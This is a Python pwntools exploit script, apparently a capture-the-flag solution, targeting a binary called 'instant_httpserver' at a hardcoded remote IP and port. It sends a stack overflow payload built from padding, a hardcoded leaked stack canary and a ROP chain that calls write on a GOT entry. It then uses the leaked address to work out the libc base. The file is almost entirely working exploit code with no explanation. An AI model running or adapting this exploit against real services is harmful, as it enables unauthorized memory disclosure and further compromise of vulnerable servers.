from pwn import *
import time


addr_prog = 0x560abcbfc000  # remote
canary = 0x4bd371f7fd688900  # remote
# addr_prog = 0x00005616bcc77000  # local
# canary = 0x7cda2a6129bd6f00  # local


context.log_file = 'DEBUG'
elf = ELF("./instant_httpserver")
libc = ELF('./libc.so.6')


pop_rdi = addr_prog + 0xe93
pop_rsi_r15 = addr_prog + 0xe91

# io = remote('localhost', 4445)
io = remote('114.177.250.4', 4445)
payload = b''
payload += b'A' * 0x208
payload += p64(canary)
payload += p64(0xdeadbeeffeedbaad)
payload += p64(pop_rdi)
payload += p64(4)
payload += p64(pop_rsi_r15)
payload += p64(addr_prog + elf.got['write'])
payload += p64(0xdeadbeeffeedbaad)
payload += p64(addr_prog + elf.plt['write'])

io.send(payload)
time.sleep(0.1)

print(len(payload)-64)
io.recvuntil(b'Your Req Length is')
io.recvuntil(b'%d' % (len(payload) - 64))
# io.recvuntil(b'\r\n')
data = io.recv()
print(hexdump(data))
addr_libc = u64(data[:8]) - libc.symbols['write']
print('addr_libc = 0x{:x}'.format(addr_libc))
